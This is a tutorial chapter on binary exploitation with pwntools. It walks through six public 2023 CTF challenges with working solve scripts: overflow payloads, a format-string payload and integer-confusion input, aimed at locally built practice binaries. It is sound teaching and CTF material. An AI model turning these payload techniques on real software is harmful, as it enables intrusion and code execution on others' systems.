# Chapter 11 — Binary Exploitation with Python and pwntools

"Pwn" is the category where you send bytes to a compiled C program and make it
misbehave — usually to hand you a shell. You don't need to be a
reverse-engineering expert; you need a working model of the stack, a debugger,
and **pwntools**, the Python library that automates the loop. This chapter builds
that model, grows `ctfkit.pwn`, and walks six real challenges from an unused
`win()` up to libc ROP. Previous chapter: [Chapter 10](10-forensics.md). Next:
[Chapter 12](12-methodology-and-next.md). The
[pwntools quick reference](appendix-b-pwntools-reference.md) collects the API in
one place.

## The stack and the calling convention

When a function runs, its local variables live on **the stack**, a region of
memory that grows *downward* (toward lower addresses). A local array like
`char buf[64]` sits there. Just **above** the locals are two values the CPU needs
to return home:

```text
higher addresses
   ...
   return address   <- where the CPU jumps when this function does `ret`
   saved RBP        <- the caller's base pointer
   buf[63]
   ...
   buf[0]           <- your input starts here and writes UPWARD
lower addresses
```

A buffer overflow writes past `buf[63]`, over the saved RBP, and then over the
**return address**. Control the return address and you control where the program
goes next. On x86-64 Linux the key facts are:

- Addresses are **8 bytes, little-endian** (Chapter 11's packing helpers handle
  this).
- The first integer/pointer arguments go in registers **rdi, rsi, rdx, rcx, r8,
  r9** — so to call `system("/bin/sh")` you must get the address of `"/bin/sh"`
  into **rdi**.
- At the moment of a `call`, the stack must be **16-byte aligned**. A function
  that uses SSE instructions (many libc functions do) will crash if it is not —
  which is why ret2win payloads often need one extra bare `ret` as alignment
  padding.

> **Why a bare `ret` fixes alignment.** Each address you place on the stack is 8
> bytes. If jumping straight to `win` leaves the stack off by 8, the `movaps`
> inside `system` faults. A single `ret` gadget pops 8 bytes and continues,
> nudging alignment back to a 16-byte boundary before the real call.

## Looking inside with gdb

`gdb` shows the program's guts: disassembly, registers, memory. Many pwners add
the **pwndbg** or **GEF** plugin for nicer output, but plain gdb confirms an
offset fine. Compile a tiny vulnerable program and look at its `win`:

```console
$ gdb -q -batch -ex 'file demo' -ex 'disassemble win'
Dump of assembler code for function win:
   0x0000000000401176 <+0>:     endbr64
   0x000000000040117a <+4>:     push   %rbp
   0x000000000040117b <+5>:     mov    %rsp,%rbp
   0x000000000040117e <+8>:     lea    0xe7f(%rip),%rax        # 0x402004
   0x0000000000401185 <+15>:    mov    %rax,%rdi
   0x0000000000401188 <+18>:    call   0x401060 <system@plt>
   ...
```

Now feed it 72 bytes of `A` then eight `B`s, and watch where it crashes:

```console
$ gdb -q -batch -ex 'file demo' \
      -ex 'run <<< $(python3 -c "print(\"A\"*72 + \"BBBBBBBB\")")' \
      -ex 'x/gx $rsp'
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c7 in main ()
0x7fffffffe578: 0x4242424242424242
```

The saved return address now holds `0x4242424242424242` — our eight `B`s. That's
the whole game: **72 bytes of padding, then 8 bytes that become the return
address.** (The stack address `0x7fff...` varies each run; the *value* we put
there is what matters.)

## pwntools: tubes, context, ELF, packing

pwntools turns "send bytes, read replies, do address math" into a few calls. The
pieces you use every time:

- **`context`** — global settings. `context.binary = elf` sets the architecture;
  `context.log_level = "error"` quiets the noise.
- **Tubes** — `process("./vuln")` runs the binary locally; `remote("127.0.0.1",
  1337)` connects to a local service (every target in this course is your own
  machine). Both speak the same methods: `send`, `sendline`, `recvuntil`,
  `sendlineafter`, `recvall`, `interactive`.
- **`ELF("./vuln")`** — parses the binary: `elf.sym.win` is a function's address,
  `elf.got`/`elf.plt` are the relocation tables, `elf.checksec()` reports
  mitigations.
- **`ROP(elf)`** — finds gadgets and builds chains.

Earlier chapters did these "by hand first"; here pwntools is the practitioner
tool you reach for. Start by reading a binary:

`examples/ch11/checksec_rop.py`

```python
import warnings
warnings.filterwarnings("ignore")  # hide an unrelated setuptools deprecation note

import os
import subprocess
from pwn import ELF, ROP, context

context.log_level = "error"
# ... compile a throwaway vulnerable binary into _scratch/ ...
elf = ELF(binp)
print(elf.checksec())
print("win()  @", hex(elf.sym.win))
ret = ROP(elf).find_gadget(["ret"])[0]
print("bare ret gadget @", hex(ret))
```

```console
$ python examples/ch11/checksec_rop.py
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
win()  @ 0x401156
main() @ 0x401170
bare ret gadget @ 0x40101a
```

`checksec` is your first read on *which* technique applies — the mitigations
section below decodes each line.

### Packing addresses

An address is just a little-endian 8-byte string. `ctfkit.pwn` wraps `struct` so
you never fumble byte order, and NUL-pads short leaks.

`examples/ch11/packing.py`

```python
from ctfkit.pwn import p32, p64, u32, u64

addr = 0x401196
print("p64(0x401196) =", p64(addr).hex(" "))
print("u64 round-trip:", hex(u64(p64(addr))))
print("p32(0xdeadbeef) =", p32(0xDEADBEEF).hex(" "))

leak = b"\x96\x11\x40"       # only three bytes came back
print("padded u64 of a 3-byte leak:", hex(u64(leak)))
```

```console
$ python examples/ch11/packing.py
p64(0x401196) = 96 11 40 00 00 00 00 00
u64 round-trip: 0x401196
p32(0xdeadbeef) = ef be ad de
padded u64 of a 3-byte leak: 0x401196
```

## Finding the offset: cyclic patterns

You rarely count padding bytes by hand. Send a **de Bruijn** pattern where every
4-byte window is unique; whatever lands in the return address is one such window,
so you look it up for the exact offset. pwntools has `cyclic`, and so does
`ctfkit.pwn` (same alphabet, so they agree).

`examples/ch11/cyclic_demo.py`

```python
from ctfkit.pwn import cyclic, cyclic_find

pattern = cyclic(64)
print("pattern:", pattern.decode())

crashed_with = pattern[40:44]  # what the saved return address held in gdb
print("bytes in return address:", crashed_with.decode())
print("offset to return address:", cyclic_find(crashed_with))

leaked_int = int.from_bytes(crashed_with, "little")
print("same answer from the int:", cyclic_find(leaked_int))
```

```console
$ python examples/ch11/cyclic_demo.py
pattern: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
bytes in return address: kaaa
offset to return address: 40
same answer from the int: 40
```

Once you know the offset, the payload is padding + the addresses you want.
`flat` assembles it:

`examples/ch11/flat_demo.py`

```python
from ctfkit.pwn import flat, p64

ret_gadget = 0x40101A
win = 0x401196
payload = flat(b"a" * 72, ret_gadget, win)
print("length:", len(payload))
print("hex:", payload.hex())

padded = flat(0xDEADBEEF, length=16, filler=b"\x90")
print("padded:", padded.hex(), "(", len(padded), "bytes )")
```

```console
$ python examples/ch11/flat_demo.py
length: 88
hex: 616161616161616161616161...1a104000000000009611400000000000
padded: efbeadde000000009090909090909090 ( 16 bytes )
```

## Mitigations and how leaks defeat them

`checksec` reports four defenses. Each changes which technique works:

| Mitigation | What it does | How you beat it |
|------------|--------------|-----------------|
| **NX** (No-eXecute) | The stack is not executable, so you cannot run shellcode you wrote there. | **Reuse existing code**: ret2win, or ROP into libc. |
| **PIE** | The binary loads at a random base each run, so its own addresses move. | **Leak** one of its addresses, subtract the known file offset to get the base. |
| **ASLR** | libc and the stack load at random addresses. | Same: **leak** a libc address, compute the base, then every symbol is base + offset. |
| **Canary** | A random value sits before the saved return address; a corrupted canary aborts the program. | **Leak** the canary (e.g. format string) and write it back unchanged, or avoid overwriting it. |

The pattern is a theme: **modern exploitation is a leak followed by arithmetic.**
`ctfkit.pwn.libc_base` and `resolve` do that arithmetic and sanity-check it.

`examples/ch11/leak_math.py`

```python
from ctfkit.pwn import libc_base, resolve

PUTS_OFF = 0x80E50
SYSTEM_OFF = 0x50D60
BINSH_OFF = 0x1D8678

leaked_puts = 0x7F3C2A88E50           # a runtime address the program leaked
base = libc_base(leaked_puts, PUTS_OFF)
print("libc base :", hex(base))
print("system()  :", hex(resolve(base, SYSTEM_OFF)))
print('"/bin/sh" :', hex(resolve(base, BINSH_OFF)))

try:
    libc_base(leaked_puts, 0x80E51)   # wrong offset -> unaligned base
except ValueError as exc:
    print("bad offset caught:", exc)
```

```console
$ python examples/ch11/leak_math.py
libc base : 0x7f3c2a08000
system()  : 0x7f3c2a58d60
"/bin/sh" : 0x7f3c2be0678
bad offset caught: base 0x7f3c2a07fff is not page-aligned; wrong symbol offset or bad leak?
```

The alignment check is a cheap guardrail: a real libc base is page-aligned (ends
in `000`), so an unaligned result means a wrong offset or a mis-read leak — catch
it before you waste a connection.

## Building ctfkit: pwn

Chapter 10 left `ctfkit` through `forensics`. This chapter adds one module,
`ctfkit/pwn.py`, plus its tests:

```console
$ diff -rq project/ch10/ctfkit project/ch11/ctfkit
Only in project/ch11/ctfkit: pwn.py
```

`pwn.py` is the arithmetic layer — packing, de Bruijn offsets, payload building,
leak math — while pwntools provides the machinery (`ELF`, `ROP`, tubes). Tiny,
dependency-free helpers mean the tests run without a target binary.

`project/ch11/ctfkit/pwn.py` (packing)

```python
import struct

def p64(value: int) -> bytes:
    """Pack an int as little-endian unsigned 64-bit."""
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)

def u64(data: bytes) -> int:
    """Unpack little-endian unsigned 64-bit, right-padding short leaks with NULs."""
    return struct.unpack("<Q", data.ljust(8, b"\x00")[:8])[0]
```

`p32`/`u32` are the 32-bit twins. The masks and `ljust` padding mean you can
pass an oversized int or a short leak without a crash — the two things that bite
you mid-exploit.

`project/ch11/ctfkit/pwn.py` (de Bruijn offsets)

```python
def cyclic(length: int, n: int = 4) -> bytes:
    """A de Bruijn pattern of ``length`` bytes (every ``n``-byte window unique)."""
    gen = _de_bruijn(_ALPHABET, n)
    out = bytearray()
    for _ in range(length):
        try:
            out.append(next(gen))
        except StopIteration:
            raise ValueError("pattern exhausted; increase n")
    return bytes(out)

def cyclic_find(sub: bytes | int, n: int = 4) -> int:
    """Return the offset of ``sub`` within :func:`cyclic` (the overflow offset)."""
    if isinstance(sub, int):
        sub = sub.to_bytes(n, "little").rstrip(b"\x00") or b"\x00"
    pattern = cyclic(len(_ALPHABET) ** n if len(sub) >= n else 10000, n)
    idx = pattern.find(sub)
    if idx == -1:
        raise ValueError(f"{sub!r} not found in cyclic pattern")
    return idx
```

`_ALPHABET` matches pwntools' default so the two tools' offsets agree — handy
when you prototype with one and finish with the other. `flat`, `libc_base`, and
`resolve` round out the module (see the full file in `project/ch11/ctfkit/`).

### Checkpoint

```console
$ pytest -q
.................................                                        [100%]
33 passed in 0.31s
```

The complete project at this point is in `project/ch11/`.

> **A note on building challenge binaries.** Fetched binaries may lack the `+x`
> bit, and reproducing exact flags across machines is easier if you compile the
> shipped C yourself. Our solve scripts `gcc` the source locally with the right
> flags (`-fno-stack-protector -no-pie` for ret2win-style), then exploit that.
> gcc shouts warnings about `gets`/`system`/implicit declarations — expected and
> harmless, and part of the real transcripts below.

## Challenge walkthrough: ret2win

> Challenge: **ret2win** — ImaginaryCTF 2023 by ICTF organisers. Source:
> `ImaginaryCTF/ImaginaryCTF-2023-Challenges@4a1b7790` (`Pwn/ret2win`).
> License: none (organizer-published for practice).

### Recon

```console
$ python challenges/fetch.py ret2win
$ cat challenges/ret2win/challenge/vuln.c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}
```

> **Clue:** `gets(buf)` has **no bounds check** — the textbook overflow
> primitive. And `win()` is **never called** anywhere. Unused `win()` +
> unbounded `gets()` = ret2win.

### Test the hypothesis

`buf` is 64 bytes; add 8 for the saved RBP and the return address is at offset
**72** — the same number gdb showed earlier. The plan: overflow 72 bytes, place
one bare `ret` for 16-byte alignment, then the address of `win`.

### Solve

`examples/ch11/solve_ret2win.py` (core)

```python
import os, subprocess
from pwn import ELF, ROP, context, process
from ctfkit.pwn import flat, p64

context.log_level = "error"
CHALL = os.path.join(REPO, "challenges", "ret2win", "challenge")

subprocess.run(["gcc", "vuln.c", "-o", "vuln",
                "-fno-stack-protector", "-no-pie"], cwd=CHALL, check=True)
elf = ELF(os.path.join(CHALL, "vuln"))
ret = ROP(elf).find_gadget(["ret"])[0]
payload = flat(b"a" * 72, p64(ret), p64(elf.sym.win))
proc = process(elf.path, cwd=CHALL)
proc.sendline(payload)
out = proc.recvall(timeout=3).decode(errors="replace")
# ... print the ictf{...} match ...
```

```console
$ python challenges/fetch.py ret2win
$ python examples/ch11/solve_ret2win.py
vuln.c: In function 'main':
vuln.c:6:3: warning: implicit declaration of function 'gets'; did you mean 'fgets'? ...
/usr/bin/ld: /tmp/ccXXXX.o: in function 'main':
vuln.c:(.text+0x19): warning: the 'gets' function is dangerous and should not be used.
FLAG: ictf{r3turn_0f_th3_k1ng?}
```

### Why it worked / generalize

NX stops shellcode but does nothing against **reusing code already in the
binary**. A `win()` that calls `system` is a gift — you just need to reach it.
The bug class is **unbounded input → overwrite the saved return address →
redirect to existing code**. The lone `ret` gadget is the alignment detail
separating "works" from "crashes inside `system`."

## Challenge walkthrough: downunderflow

> Challenge: **downunderflow** — DownUnderCTF 2023. Source:
> `DownUnderCTF/Challenges_2023_Public@b48f83db` (`beginner/downunderflow`).
> License: none (organizer-published for practice).

### Recon

The core of `downunderflow.c` (quoted):

```c
char logins[8][6] = { "user0", ..., "user6", "admin" };   // index 7 is admin

int read_int_lower_than(int bound) {
    int x; scanf("%d", &x);
    if (x >= bound) { puts("Invalid input!"); exit(1); }   // signed check
    return x;
}

int main() {
    unsigned short idx = read_int_lower_than(7);           // stored unsigned!
    if (strncmp(logins[idx], "admin", 5) == 0) system("/bin/sh");
    ...
}
```

> **Clue:** The bound check is on a **signed** `int` (`x >= 7` rejected), but the
> index is an **unsigned short**. A negative number passes the check, then wraps
> when narrowed to 16 bits.

### Test the hypothesis

You need `idx == 7` to hit the `admin` entry, without passing 7 to the check.
Any negative `x` satisfies `x < 7`. Narrowing to `unsigned short` is mod 65536,
so you want `x ≡ 7 (mod 65536)`:

```console
$ python3 -c "print(-65529 % 65536)"
7
```

`-65529` is negative (passes the signed check) yet becomes `7` as an unsigned
short → `logins[7] == "admin"` → shell.

### Solve

`examples/ch11/solve_downunderflow.py` (core)

```python
subprocess.run(["gcc", "downunderflow.c", "-o", "downunderflow"], cwd=CHALL, check=True)
proc = process(os.path.join(CHALL, "downunderflow"), cwd=CHALL)
proc.sendline(b"-65529")        # (unsigned short)(-65529) == 7 -> admin
proc.sendline(b"cat flag.txt")  # the spawned /bin/sh runs this
out = proc.recvall(timeout=3).decode(errors="replace")
# ... print the DUCTF{...} match ...
```

```console
$ python challenges/fetch.py downunderflow
$ python examples/ch11/solve_downunderflow.py
FLAG: DUCTF{-65529_==_7_(mod_65536)}
```

### Why it worked / generalize

No overflow, no shellcode — just a **type confusion**. A check in one integer
type (signed int) is defeated when the value is *used* in another (unsigned
short). The bug class is **sign/width mismatch between check and use**. When a
bounds check and the index have different types, test the boundaries: negatives,
`0`, and values near `2**width`.

## Challenge walkthrough: form (format string)

> Challenge: **form** — ImaginaryCTF 2023 by ICTF organisers. Source:
> `ImaginaryCTF/ImaginaryCTF-2023-Challenges@4a1b7790` (`Pwn/form`).
> License: none (organizer-published for practice).

### Recon

```c
char *flag = malloc(0x20);
char *buf  = malloc(0x20);
fgets(flag, 0x20, fptr);     // reads flag.txt into flag
fgets(buf, 0x20, stdin);     // reads your input into buf
flag = &buf;
if (strlen(flag) <= 23) printf(buf);   // <-- printf(user_input)
```

> **Clue:** `printf(buf)` passes **user input as the format string**. Any `%`
> specifier you send is interpreted by `printf`, letting you read the stack with
> `%p`/`%s`.

### Test the hypothesis

A format string lets you walk the variadic arguments. `%N$s` treats argument
slot `N` as a pointer and prints the string there. The flag's heap pointer sits
a few slots in; a short run of `%c` advances the argument pointer, then `%N$s`
dereferences the flag pointer and prints it. The exact slot is ABI/stack
dependent, so it can need a nudge on another toolchain — here it's slot 6
(`%6$s`).

> **Shell gotcha for writers.** Keep `%6$s` out of unquoted shell heredocs — the
> shell expands `$s`. Put the payload in a `.py` file (as the solver does) or a
> single-quoted string.

### Solve

`examples/ch11/solve_form.py` (core)

```python
PAYLOAD = b"%155c%c%c%c%c%c%hhn%6$s"   # advance varargs, then read flag ptr
subprocess.run(["gcc", "vuln.c", "-o", "vuln"], cwd=CHALL, check=True)
proc = process(os.path.join(CHALL, "vuln"), cwd=CHALL)
proc.sendline(PAYLOAD)
out = proc.recvall(timeout=3).decode(errors="replace")
# ... print the ictf{...} match ...
```

```console
$ python challenges/fetch.py form
$ python examples/ch11/solve_form.py
vuln.c: In function 'main':
...
vuln.c:16:3: warning: format not a string literal and no format arguments [-Wformat-security]
   16 |   if (strlen(flag) <= 23) printf(buf);
      |   ^~
FLAG: ictf{ngl_kinda_bored_of_these}
```

The `-Wformat-security` warning is gcc pointing straight at the bug. For
arbitrary writes (not just reads) pwntools' `fmtstr_payload` builds the `%n`
chains automatically; here a direct `%6$s` read is enough.

### Why it worked / generalize

User input reached `printf` as the **format argument**. The bug class is **format
string**: `%p`/`%s` read memory, `%n` writes it. Grep any C target for
`printf(x)`, `fprintf(f, x)`, `sprintf(..., x)` where `x` is attacker-controlled
and has no literal format of its own.

## Challenge walkthrough: safe-calculator

> Challenge: **safe-calculator** — DownUnderCTF 2023. Source:
> `DownUnderCTF/Challenges_2023_Public@b48f83db` (`pwn/safe-calculator`).
> License: none (organizer-published for practice).

### Recon

Three functions matter (quoted essentials):

```c
void win() { system("/bin/sh"); }

void calculate() {
    size_t arg1, arg2;                              // 64-bit locals
    sscanf(sum, "{ arg1: %d, arg2: %d}", &arg1, &arg2);  // %d writes 32 bits
    if (arg1 + arg2 == 13370166083584009001) win();
}

void leave_review() {
    char buf[0x30];
    scanf("%48[ -~]", buf);                         // up to 48 printable bytes
}
```

> **Clue:** `arg1`/`arg2` are `size_t` (8 bytes) but `sscanf("%d")` writes only
> the **low 4 bytes**. The high 4 bytes keep whatever was on the stack — the bug
> is the type/format mismatch. The hint even says "take a close look at the
> types" and "there is no vulnerability in leave_review, but it's useful!"

### Test the hypothesis

`calculate()` and `leave_review()` run at the same call depth, so their stack
frames **overlap**. Bytes you leave in `leave_review`'s `buf` survive as the
uninitialised **high dwords** of `arg1`/`arg2`. Pick printable bytes so the
64-bit sum equals the magic constant — no leak, no brute force, just arranging
the stack. Two reviews set the two high dwords you need.

### Solve

`examples/ch11/solve_safe_calculator.py` (core)

```python
binary = os.path.join(CHALL, "publish", "safe-calculator")
os.chmod(binary, 0o755)
shutil.copyfile(os.path.join(CHALL, "src", "flag.txt"),
                os.path.join(CHALL, "publish", "flag.txt"))
proc = process(binary, cwd=os.path.join(CHALL, "publish"))
for review in (b"A"*36 + b"X"*8 + b"A.ZX", b"A"*36 + b"712aXXXX"):
    proc.sendlineafter(b">", b"2")
    proc.sendlineafter(b"review! : ", review)
proc.sendlineafter(b">", b"1")   # calculate() -> win()
proc.sendline(b"cat flag.txt")
# ... print the DUCTF{...} match ...
```

```console
$ python challenges/fetch.py safe-calculator
$ python examples/ch11/solve_safe_calculator.py
FLAG: DUCTF{d1d_y0u_p0p_c4lc?}
```

### Why it worked / generalize

Uninitialised stack memory isn't random — it's **leftovers from the previous
frame**. Control what the earlier function wrote and you control what the later
one "finds." The bug class is **`%d` into a wider type leaving attacker-chosen
high bytes**. When `scanf`/`sscanf` widths don't match the C types, suspect this.

## Challenge walkthroughs: one-byte and minimal (NEEDS-ATTENTION)

These two are the hard end of the chapter. Their partial solvers build the
binary, take the leak, and set up the primitive, but the finishing move is tied
to the exact original target and won't reproduce headless on a 64-bit-only box.
We teach the technique and print the organizer-published flag.

### one-byte

> Challenge: **one-byte** — DownUnderCTF 2023 (`beginner/one-byte`).

```c
printf("Free junk: 0x%lx\n", init);   // leaks init() -> defeats any PIE guess
char buf[0x10];
read(0, buf, 0x11);                    // reads 0x11 into a 0x10 buffer: 1 over
```

> **Clue:** The printed address is a **PIE leak**. The `0x10` buffer vs `0x11`
> read is a **one-byte overflow** — it spills a single byte into the
> least-significant byte of the saved RBP.

The technique: overwrite one byte of saved RBP so a later `leave; ret` pivots
the stack onto a planted `p32(win)` (author payload `p32(win) + b'x'*12 +
b'\x24'`, a ~1/16 brute on the randomised stack byte). Our partial solver reads
the real leak and computes `win`:

```console
$ python challenges/fetch.py one-byte
$ python examples/ch11/solve_one_byte.py
... gcc warnings ...
leaked init @ 0x4011b6; win @ 0x4011fd
NEEDS-ATTENTION: single-byte saved-RBP pivot not automated.
Organizer-published flag: DUCTF{all_1t_t4k3s_is_0n3!}
```

> **Heads-up.** The original binary is **32-bit**, where
> `__libc_start_main`'s epilogue does a `leave` that consumes our corrupted RBP
> and pivots the stack. Modern 64-bit glibc uses `__libc_start_call_main`, which
> does not `leave` with our RBP after `main` returns, so the single-byte pivot
> has no second `leave` to land on (empirically 0/600 locally). Finishing it
> needs the shipped 32-bit binary or a 32-bit toolchain.

### minimal

> Challenge: **minimal** — ImaginaryCTF 2023 (`Pwn/minimal`).

```c
int main() { char buf[8]; syscall(0, 0, buf, 0x900); }  // read() up to 0x900 into buf[8]
```

A huge overflow, but the binary is "minimal" — almost no gadgets — and ships its
own `libc.so.6` + loader (the tell-tale sign of a **ret2libc**). Our partial
solver loads both and reports the key addresses:

```console
$ python challenges/fetch.py minimal
$ python examples/ch11/solve_minimal.py
vuln syscall GOT @ 0x404018; libc system @ 0x50d60
NEEDS-ATTENTION: GOT-rewrite + ASLR brute ROP not automated.
Organizer-published flag: ictf{wh0_even_needs_p0p_rdi_1b20a23f}
```

> **Heads-up.** The official exploit rewrites the `syscall` GOT entry toward
> `system` with a self-modifying `add dword [rbp-0x3d], ebx` gadget, then
> `ret`-slides and lands via a 2-byte partial overwrite — a `while True` ASLR
> brute whose gadget offsets assume the **exact** bundled libc layout and the
> organiser's `run.py` driver. A capped local brute against the bundled glibc
> did not converge headless; finishing it needs that exact libc/driver.

### Why they're still worth it

Both teach the real shape of hard pwn: **leak → compute → pivot**, and the
uncomfortable truth that exploits are brittle against the *exact* libc and
loader. When your gadget offsets are off by a release, nothing fires — which is
why challenges ship their libc, and why you match it precisely.

## Summary

- The stack holds locals, the saved RBP, and the **return address**; overflow
  the locals and you overwrite where the function returns.
- x86-64 passes args in **rdi, rsi, rdx, ...** and needs **16-byte alignment** at
  a `call` — hence the extra `ret` gadget in ret2win.
- **pwntools** is the loop: `context`, tubes (`process`/`remote` on 127.0.0.1),
  `ELF`, `ROP`. `ctfkit.pwn` does the packing and address math.
- Find offsets with **cyclic** patterns, not counting. Build payloads with
  `flat`.
- Mitigations dictate technique: **NX** → reuse code; **PIE/ASLR** → leak then
  compute (`libc_base`); **canary** → leak and replay it.
- Clue → bug class: unused `win()` → ret2win; no-bounds input → overflow;
  signed/unsigned or `%d`-into-`size_t` → integer/type bug; `printf(user)` →
  format string; bundled libc → ret2libc/ROP.

## Exercises

1. **Confirm the offset yourself.** Compile `ret2win`'s `vuln.c` and use gdb (or
   pwntools `cyclic`) to prove the return address is at offset 72. Then change
   `buf` to `char buf[40]` and re-derive the offset.

   <details><summary>Solution</summary>

   Send `cyclic(200)`, let it crash, read the saved return address, and call
   `cyclic_find` on it:

   ```python
   from pwn import process, context
   from ctfkit.pwn import cyclic, cyclic_find
   context.log_level = "error"
   p = process("./vuln")
   p.sendline(cyclic(200))
   p.wait()
   core = p.corefile
   ret = core.read(core.rsp, 4)       # bytes at the stack pointer on crash
   print(cyclic_find(ret))
   ```

   With `buf[64]` the offset is 72 (64 + 8 saved RBP); with `buf[40]` it is 48.
   The rule: buffer size rounded up to the stack layout, plus 8 for saved RBP.
   </details>

2. **remote() vs process().** Wrap `ret2win` in its shipped Dockerfile, run it
   bound to `127.0.0.1:1337`, and change the solver to `remote("127.0.0.1",
   1337)`. Confirm the same payload works, then `docker rm -f` the container.

   <details><summary>Solution</summary>

   ```console
   $ docker build -t ctfkit-ret2win challenges/ret2win/challenge
   $ docker run --rm -d -p 127.0.0.1:1337:1337 --name r2w ctfkit-ret2win
   ```

   Swap `process(elf.path)` for `remote("127.0.0.1", 1337)`; the payload is
   identical because the binary is the same. Always target 127.0.0.1 (your own
   container) and tear it down: `docker rm -f r2w`.
   </details>

3. **Format-string read, slot by slot.** Against `form`, send `"%p " * 10` and
   identify which `%p` slot holds the flag's heap pointer. Explain why `%6$s`
   matched on our toolchain but might differ on yours.

   <details><summary>Solution</summary>

   Each `%p` prints one argument slot as a hex pointer. One of them is a heap
   address (`0x55...` or `0x56...`); the slot number depends on how many
   arguments `printf` already consumed and on stack layout, which varies by
   compiler/libc. Once you find the slot `N` showing the heap pointer, `%N$s`
   dereferences it to print the flag.
   </details>

4. **Integer boundaries.** For `downunderflow`, find *every* input in
   `[-70000, 0)` that makes `idx == 7`, and explain the period.

   <details><summary>Solution</summary>

   ```python
   print([x for x in range(-70000, 0) if (x & 0xffff) == 7])
   # [-65529]  (the only x in this range with x ≡ 7 mod 65536)
   ```

   Narrowing to `unsigned short` is mod 65536, so solutions repeat every 65536.
   In that range only `-65529` is both negative and `≡ 7`.
   </details>

Sources for this chapter: [REFERENCES.md](REFERENCES.md#chapter-11--binary-exploitation-with-python-and-pwntools)
